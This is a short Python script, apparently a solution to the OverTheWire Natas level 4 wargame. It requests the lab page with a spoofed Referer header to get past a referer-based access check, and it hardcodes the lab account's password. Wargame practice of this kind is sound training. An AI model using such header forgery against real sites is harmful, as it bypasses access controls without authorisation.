#referer
import requests, bs4
url='http://natas4.natas.labs.overthewire.org/'
auth=('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
referer='http://natas5.natas.labs.overthewire.org/'
s=requests.Session()
s.headers.update({'referer':referer})
resp=s.get(url,auth=auth)

print(resp.content)
